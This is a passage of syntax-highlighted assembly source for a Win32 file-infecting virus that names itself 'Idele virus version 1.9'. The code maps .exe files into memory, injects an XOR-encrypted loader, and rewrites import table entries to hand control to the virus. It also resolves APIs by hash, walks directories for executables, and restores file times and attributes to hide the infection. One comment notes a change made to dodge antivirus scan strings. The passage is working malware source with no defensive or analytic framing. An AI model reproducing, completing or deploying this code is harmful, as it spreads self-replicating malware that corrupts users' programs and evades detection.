         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;ecx=number of useless bytes in</span><span class="sc0">
                                                </span><span class="sc1">;the heap</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         
 
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;set eax to 0</span><span class="sc0">

</span><span class="sc5">Nullify</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">


</span><span class="sc1">;[compute new entry point]:</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;eax=RVA of Loader</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;add ImageBase</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               </span><span class="sc1">;save loader size</span><span class="sc0">


          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_FT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">


            
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_OFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_NewFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        
</span><span class="sc5">CopyMore</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">movsd</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">CopyMore</span><span class="sc0">         
      
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;restore loader size</span><span class="sc0">


</span><span class="sc1">;[Copy loader code to target file on disk]:</span><span class="sc0">
     

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;restore pointer (on disk) to code loader</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">BeginLoader</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFileStuff</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


 </span><span class="sc5">ExitInfectError2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        
 

 </span><span class="sc5">ExitInfectError0</span><span class="sc4">:</span><span class="sc0">
 
        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 


 </span><span class="sc5">ExitInfectError</span><span class="sc4">:</span><span class="sc0">

  
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFileStuff</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
      
 </span><span class="sc5">OpenFileStuff</span><span class="sc4">:</span><span class="sc0">
   
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">              </span><span class="sc1">;Read and Code abilities</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;save FileHandle </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitOpenFileStuffError</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;eax=Address of Mapping</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">   
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
     
 </span><span class="sc5">ExitOpenFileStuffError</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 

 </span><span class="sc5">CloseFileStuff</span><span class="sc4">:</span><span class="sc0">


 </span><span class="sc5">UnMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">CloseMapHandle</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">ResizeFile</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        
 </span><span class="sc5">MarkEndOfFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetEndOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 


</span><span class="sc5">RestoreTime</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LastWriteTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LastAccessTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreationTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


 </span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                 
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">RestoreFileAttributs</span><span class="sc4">:</span><span class="sc0"> 

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttributes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



 </span><span class="sc1">;change a RVA to a file pointer</span><span class="sc0">
 </span><span class="sc1">;In : ebx points to first section </span><span class="sc0">
 </span><span class="sc1">;Out: eax contains the file offset</span><span class="sc0">

 </span><span class="sc5">Rva2Offset</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SectN</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">_Loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">_Find</span><span class="sc0">

        </span><span class="sc5">NoRawData</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">_Loop</span><span class="sc0">
       

 </span><span class="sc5">_Find</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        
        </span><span class="sc6">ret</span><span class="sc0">


 </span><span class="sc5">BeginLoader</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">          </span><span class="sc1">;call GlobalAlloc</span><span class="sc0">
        </span><span class="sc5">ReturnAdd</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;prepare jump to virus</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;added to modify scan string</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">VirLength</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc0">              </span><span class="sc1">;mov esi,****</span><span class="sc0">
        </span><span class="sc5">LastSectionCode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0"> 
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">
        </span><span class="sc5">Key</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0abcdef12h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc0"> 
        </span><span class="sc6">ret</span><span class="sc0">                  </span><span class="sc1">;go to beginning of code</span><span class="sc0">

 </span><span class="sc5">EndLoader</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Constants</span><span class="sc4">:</span><span class="sc0">
         
        </span><span class="sc5">ApiNb</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
        </span><span class="sc5">MaxPath</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc5">Miliseconds</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1500</span><span class="sc0">
        </span><span class="sc5">HowMany</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">VirLength</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0a00h</span><span class="sc0">
        </span><span class="sc5">VirLength0</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EndVir0</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">
        </span><span class="sc5">LoaderLength</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EndLoader</span><span class="sc4">-</span><span class="sc5">BeginLoader</span><span class="sc0">

        </span><span class="sc5">Sign</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Idele virus version 1.9"</span><span class="sc0"> 
                                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DoxtorL./[T.I]/Dec.Y2K"</span><span class="sc0">

        
        </span><span class="sc5">SizeT</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">VA_API</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        
        </span><span class="sc5">ImageBase</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      
        
        </span><span class="sc5">FP_OFT</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">VA_OFT</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                

        </span><span class="sc5">FP_FieldFT</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FP_FT</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">RVA_FT</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">VA_FT</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 

        </span><span class="sc5">FP_NewFT</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">RVA_NewFT</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">VA_NewFT</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">FindMatch</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FindMatch2</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DotDot</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GlobalAPI</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ApiHack</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;only for the</span><span class="sc0">
                                                     </span><span class="sc1">;1st generation</span><span class="sc0">
                                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;reserved for char</span><span class="sc0">
                                                     </span><span class="sc1">;of api name found</span><span class="sc0">


 </span><span class="sc5">ApiList</span><span class="sc0">                         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fdbe9ddfh</span><span class="sc0">  </span><span class="sc1">;CloseHandle</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04b00fba1h</span><span class="sc0">  </span><span class="sc1">;CreateFileA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00d6ea22eh</span><span class="sc0">  </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be307c51h</span><span class="sc0">  </span><span class="sc1">;CreateThread</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be7b8631h</span><span class="sc0">  </span><span class="sc1">;FindClose</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c915738fh</span><span class="sc0">  </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08851f43dh</span><span class="sc0">  </span><span class="sc1">;FindNextFileA</span><span class="sc0">
